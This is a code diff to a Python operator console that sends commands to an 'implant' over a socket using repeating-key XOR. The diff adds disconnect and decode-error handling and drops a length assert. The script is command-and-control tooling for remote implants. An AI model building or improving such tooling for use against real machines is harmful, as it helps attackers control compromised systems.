@@ -11,7 +11,14 @@ def fixed_xor(arg1: bytes, arg2: bytes) -> bytes:
     return bytes([arg1[i] ^ arg2[i] for i in range(len(arg1))])
   
 def xor(message: bytes, key: bytes) -> bytes:
-    assert len(message) >= len(key)
+    """XOR a message with a repeating key.
+
+    Works for messages of any length, including empty messages, without
+    asserting on the length. This avoids crashes when the socket returns
+    zero bytes (peer closed the connection).
+    """
+    if not message:
+        return b""
     ret = []
     for i in range(len(message)):
         ret.append(message[i] ^ key[i % len(key)])
@@ -41,8 +48,22 @@ def parse(s: socket.socket, user_input):
         assert(data == '')
     s.send(enc(("  ".join([type, id, data])).encode()))
 while True:
+    # Send a command
     parse(s, input('> '))
-    print(dec(s.recv(4096)).decode().replace('\\n', '\n'))
+
+    # Receive the response; handle clean disconnects gracefully.
+    ciphertext = s.recv(4096)
+    if not ciphertext:
+        print("[!] Connection closed by implant")
+        break
+
+    try:
+        response = dec(ciphertext).decode().replace('\\n', '\n')
+    except Exception as e:
+        print(f"[!] Error decoding response: {e}")
+        break
+
+    print(response)
 
 
 s.close()
